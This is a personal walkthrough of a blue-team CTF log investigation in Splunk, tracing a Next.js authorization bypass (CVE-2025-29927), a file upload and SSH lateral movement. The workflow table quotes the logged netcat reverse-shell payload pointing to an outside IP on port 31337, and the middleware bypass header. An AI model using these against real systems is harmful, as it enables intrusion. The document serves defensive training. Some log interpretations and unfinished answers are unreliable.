#ctf #LinuxLogsCTF #NextJS #Splunk
# Context
The security team at MiddleMayhem Inc. has detected unusual network traffic to their admin portal, but no security breaches have been confirmed. Your SOC team has been provided with SIEM logs from the incident. Analyze the attack pattern to determine how attackers bypassed authentication, gained remote code execution, and moved laterally through the network.

[CTF Link](https://blueteamlabs.online/home/investigation/middlemayhem-aa3c27f5d1)
[Proof of completion link](https://blueteamlabs.online/achievement/share/172832/259)
# ScratchPad

# Questions
1. Access the Website in the browser, present it in the bookmark, and identify the JavaScript framework and version used. _(2 points)_
- To find and access the local host web pages, Run:
```shell
ps aux | grep -E "apache."
```
```shell
sudo ss -tulpn | grep -E ':(443|80)'
```
* On the login page of the website, Use developer tools and enter into the console" `window.next.version` 15.0.0 and next.js are the answers.
* Go to the main page and extract all the contents, upload to cyberchef and use modules XML beautify and syntax highlighter. Search for filepaths and comments like 
> [!Identifying the Javascript framework and version via console]
>- **Next.js:** `window.next.version`
> - **Vue:** `window.Vue.version` or `window.__VUE__.version`
> - **jQuery:** `window.jQuery.fn.jquery`
> * ***React:** `window.__REACT_DEVTOOLS_GLOBAL_HOOK__` (requires DevTools extension)

> [!HTTP Response Headers]
> Look for headers advertising the framework, such as `X-Powered-By: Next.js` or `X-Powered-By: Express` (which occasionally includes the version depending on how the server is configured).

2. Using Splunk, Find the attacker’s IP address _(3 points)_
```splunk
index=* host=webapp http_response_code=200 ip_src="172.217.164.174" 
```
1. Analyze the SIEM logs to determine how many unique URIs were accessed by the attacker. _(2 points)_
```splunk
index=* host=webapp ip_src="218.92.0.204" |stats dc(http_request_uri) as "Unique URIs Accessed"
```
1. Explore the site and identify two specific locations that could reveal internal structures or potential access points not meant for public eyes. Provide the two relative URLs. _(3 points)_
	* Searching for robots.txt on the main page showed this /admin, `/admin/file-upload`
2. Based on the Framework and Version, what recent CVE could be used to bypass authorization? _(4 points)_
	* Google search the framework and version, `CVE-2025-29927` is the answer
3. Find the relevant HTTP header in the SIEM logs that indicates CVE exploitation. Provide the header name. _(3 points)_
`x-middleware-subrequest`
```shell
index=* "x-middleware-subrequest" ip_src="218.92.0.204"
# Used to find the CVE exploitation
```
1. What interesting URI did the attacker access after exploiting the CVE? _(3 points)_
```shell
index=* earliest="03/24/2025:11:06:34" ip_src="218.92.0.204"
```
* Answer was `/api/upload`
1. The attacker tried uploading a reverse shell. Find out the IP and port to which the target would connect once the connection is established. _(2 points)_
```splunk
index=* tcp_srcport="31337"
# Used to find the execution of the reverse shell
```
```splunk
index=* host=webapp http_request_method="POST"
# Used to find the reverse shell
```
1. After compromising the WebApp server, the attacker attempted lateral movement. Identify the technique used, as recorded in the SIEM logs. _(2 points)_
2. Identify the user account that achieved successful lateral movement to another server. _(1 points)_
# Workflow
TA's IPs: 218.x.x.x.
Webapp IP: 172.x.x.x

| Source(File system, URL History, registry)                                                                                                                                                                                               | Summary                                                                   | Attribute(Created,visited,last modified<br>Mhm | Timestamp                     | Summary(file type, description) | Query used                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ---------------------------------------------- | ----------------------------- | ------------------------------- | ----------------------------------------------------------------------------------------- |
|                                                                                                                                                                                                                                          | Exploitation - Reverse shell established using netcat with                |                                                | 2025-03-24T11:06:35.000+00:00 |                                 | index=* host=webapp tcp_dstport=31337                                                     |
| filename="shell.sh"\r\nContent-Type: application/octet-stream\r\n\r\n#!/bin/bash\nrm -f /tmp/f; mkfifo /tmp/f\ncat /tmp/f \| /bin/bash -i 2>&1 \| nc 113.89.232.157 31337 > /tmp/f\n\r\n--------------------------cbc80cfd82429ee7--\r\n | Reverse shell payload uploaded to webapp via /api/upload                  |                                                | 2025-03-24T11:06:34.000+00:00 |                                 | index=* host=webapp http_request_method="POST"<br># Used to find the reverse shell        |
| Host: 172.217.164.174:8080\r\n,User-Agent: curl/7.81.0\r\n,Accept: */*\r\n,x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n	<br>                                                                      | TA exploits CVE using middleware header to gain access to the admin panel |                                                | 2025-03-24T11:06:22.000+00:00 |                                 |                                                                                           |
|                                                                                                                                                                                                                                          | TA accesses ssh credentials to DBserver from 172.217.164.174              |                                                |                               |                                 | index=* earliest="03/24/2025:11:06:35" host=dbserver                                      |
| Mar 24 16:44:20 dbserver sshd[80889]: Connection closed by authenticating user dbserv 172.217.164.174 port 41882 [preauth]                                                                                                               | TA logs in successfully to dbserver as dbserv                             |                                                | 2025-03-24 11:14:20           |                                 | index=* earliest="03/24/2025:11:06:35" host=dbserver <br>\| table _time, user, host, _raw |
| Mar 24 16:44:21 dbserver sshd[80891]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.217.164.174  user=dbserv                                                                               | TA brute forcing dbserver SSH login                                       |                                                |                               |                                 |                                                                                           |
